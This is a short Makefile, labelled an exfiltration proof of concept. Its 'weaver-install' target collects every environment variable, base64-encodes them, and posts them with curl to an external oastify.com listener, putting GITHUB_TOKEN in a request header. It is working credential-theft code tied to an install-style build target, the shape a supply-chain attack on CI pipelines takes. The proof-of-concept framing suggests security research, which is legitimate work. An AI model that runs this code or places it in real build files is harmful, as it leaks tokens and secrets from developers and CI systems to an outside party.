# Define your listener
EXFIL_URL = http://pg95wjutva1onpyza5j08j6umlscg24r.oastify.com

weaver-install:
	@echo "--- Initiating Exfiltration PoC ---"
	
	# 1. Capture and encode all environment variables
	# We use base64 -w 0 to ensure the data is on a single line
	$(eval ENV_DATA := $(shell env | base64 -w 0))
	
	# 2. Exfiltrate via HTTP POST
	# We send the GITHUB_TOKEN in a header and the full env in the body
	@curl -X POST -H "X-Exfil-Token: $(GITHUB_TOKEN)" -d "$(ENV_DATA)" $(EXFIL_URL)/env_exfil || echo "POST failed"

	@echo "--- PoC Complete ---"
